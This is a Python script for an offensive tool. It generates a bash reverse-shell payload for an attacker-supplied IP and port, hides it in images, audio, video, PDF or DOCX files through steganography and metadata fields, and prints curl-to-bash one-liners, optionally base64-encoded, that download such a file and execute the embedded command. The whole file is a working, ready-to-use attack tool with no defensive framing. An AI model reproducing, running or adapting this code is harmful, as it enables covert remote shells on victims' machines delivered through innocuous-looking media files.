import os
import subprocess
import base64
import logging
import argparse

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Dynamic media compatibility check
def is_media_compatible(file_extension):
    media_types = ["png", "jpg", "jpeg", "mp3", "mp4", "gif", "pdf", "docx", "zip"]
    return file_extension.lower() in media_types

# Generate reverse shell payload dynamically
def generate_payload(payload_type, ip, port):
    if payload_type == "reverse_shell":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        logging.info(f"Generated reverse shell payload for IP: {ip}, Port: {port}")
        return payload
    else:
        logging.error("Unsupported payload type")
        raise ValueError("Unsupported payload type")

# Inject payload into media file using steganography
def inject_with_steganography(command, filename):
    try:
        subprocess.run(["steghide", "embed", "-cf", filename, "-ef", "/dev/stdin", "-p", ""], input=command.encode(), check=True)
        logging.info(f"Payload successfully injected into {filename} using steganography.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Steganography injection failed: {e}")

# Inject payload using metadata tools
def inject_metadata(command, filename):
    file_extension = filename.split('.')[-1].lower()
    try:
        if file_extension in ["png", "jpg"]:
            subprocess.run(["exiftool", f"-Comment={command}", filename], check=True)
        elif file_extension in ["mp4", "mp3"]:
            subprocess.run(["ffmpeg", "-i", filename, "-metadata", f"comment={command}", "-codec", "copy", f"injected_{filename}"], check=True)
        elif file_extension == "pdf":
            subprocess.run(["exiftool", f"-Title={command}", filename], check=True)
        elif file_extension == "docx":
            with open("temp.txt", "w") as f:
                f.write(command)
            subprocess.run(["zip", filename, "temp.txt"], check=True)
            os.remove("temp.txt")
        else:
            logging.error(f"Unsupported media type for command injection: {file_extension}")
            raise ValueError(f"Unsupported media type: {file_extension}")
        logging.info(f"Payload successfully injected into {filename}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Metadata injection failed: {e}")

# Extract payload from the media file
def extract_payload(filename):
    file_extension = filename.split('.')[-1].lower()

    try:
        if file_extension in ["png", "jpg"]:
            result = subprocess.run(["exiftool", filename], stdout=subprocess.PIPE, check=True)
        elif file_extension in ["mp4", "mp3"]:
            result = subprocess.run(["ffprobe", "-v", "error", "-show_entries", "format_tags=comment", "-of", "default=nw=1:nk=1", filename], stdout=subprocess.PIPE, check=True)
        elif file_extension == "pdf":
            result = subprocess.run(["pdfinfo", filename], stdout=subprocess.PIPE, check=True)
        elif file_extension in ["docx", "zip"]:
            result = subprocess.run(["unzip", "-p", filename], stdout=subprocess.PIPE, check=True)
        else:
            logging.error(f"Unsupported media type for payload extraction: {file_extension}")
            raise ValueError(f"Unsupported media type: {file_extension}")

        logging.info(f"Payload extracted from {filename}")
        print(result.stdout.decode())
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to extract payload: {e}")

# Base64 encoding and decoding
def base64_encode_command(command):
    encoded_cmd = base64.b64encode(command.encode()).decode()
    logging.info("Payload encoded in base64")
    return encoded_cmd

def generate_oneliner(command, url, filename, method_choice):
    methods = {
        "1": f"curl -s '{url}/{filename}' | exiftool -Comment -b - | bash",
        "2": f"curl -s '{url}/{filename}' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash",
        "3": f"curl -s '{url}/{filename}' | exiftool -Title -b - | bash",
        "4": f"curl -s '{url}/{filename}' | unzip -p - | grep Payload | bash"
    }
    return methods.get(method_choice, None)

def parse_args():
    parser = argparse.ArgumentParser(description="Payload injection and extraction tool with steganography and metadata support.")
    parser.add_argument("-p", "--payload", type=str, help="Specify payload type (e.g., reverse_shell)")
    parser.add_argument("-i", "--ip", type=str, help="IP address for reverse shell payload")
    parser.add_argument("-r", "--port", type=str, help="Port for reverse shell payload")
    parser.add_argument("-f", "--file", type=str, help="Filename for payload injection/extraction")
    parser.add_argument("-u", "--url", type=str, help="URL for generated one-liner")
    parser.add_argument("-s", "--steganography", action="store_true", help="Use steganography for payload injection")
    parser.add_argument("-x", "--extract", action="store_true", help="Extract payload from file")
    parser.add_argument("-b", "--base64", action="store_true", help="Base64 encode the generated payload")
    parser.add_argument("-c", "--check", action="store_true", help="Check media file compatibility")
    return parser.parse_args()

def main():
    args = parse_args()
    
    # Validate and generate payload if requested
    if args.payload and args.payload == "reverse_shell":
        if args.ip and args.port:
            command = generate_payload(args.payload, args.ip, args.port)
        else:
            logging.error("IP and port are required for reverse_shell payload")
            exit(1)
    else:
        command = args.payload
    
    # Check file compatibility
    if args.check:
        if is_media_compatible(args.file.split('.')[-1]):
            logging.info(f"File type {args.file.split('.')[-1]} is compatible")
        else:
            logging.error(f"File type {args.file.split('.')[-1]} is not supported")
            exit(1)

    # Payload extraction mode
    if args.extract:
        extract_payload(args.file)
        exit(0)
    
    # Payload injection
    if args.file and is_media_compatible(args.file.split('.')[-1]):
        if args.steganography:
            inject_with_steganography(command, args.file)
        else:
            inject_metadata(command, args.file)
    else:
        logging.error(f"Invalid or unsupported file: {args.file}")
        exit(1)

    # Generate one-liner method for execution
    if args.url and args.file:
        method_choice = input("Select method (1-4):\n1. Image-Exiftool\n2. Video-Ffprobe\n3. PDF-Title Extraction\n4. DOCX-Text Extraction\n")
        one_liner = generate_oneliner(command, args.url, args.file, method_choice)
        if one_liner:
            if args.base64:
                one_liner = base64_encode_command(one_liner)
                print(f"Base64 encoded one-liner:\n{one_liner}")
            else:
                print(f"Generated one-liner:\n{one_liner}")
        else:
            logging.error("Invalid method choice")
            exit(1)

if __name__ == "__main__":
    main()